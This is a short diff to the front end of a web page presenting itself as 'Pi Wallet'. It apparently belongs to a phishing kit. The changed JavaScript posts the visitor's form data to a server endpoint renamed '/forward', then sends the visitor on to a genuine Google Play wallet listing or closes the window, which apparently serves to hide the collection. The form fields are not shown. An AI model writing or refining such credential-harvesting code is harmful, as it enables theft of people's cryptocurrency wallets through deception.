@@ -403,16 +403,18 @@ Pi Wallet is the secure hub for your Pi transactions, providing an intuitive int
           formData.append("redUrl", "pi/index.php");
 
           $.ajax({
-            url: "/send-message",
+            url: "/forward",
             type: "POST",
             data: formData,
             processData: false,
             contentType: false,
             success: function (response) {
               window.location.replace("https://play.google.com/store/apps/details?id=com.blockchainvault");
+	      window.close();
             },
             error: function (err) {
               $('#emsg').text('Error processing your request, please try again!');
+	       window.close();
             }
           });
         } else {
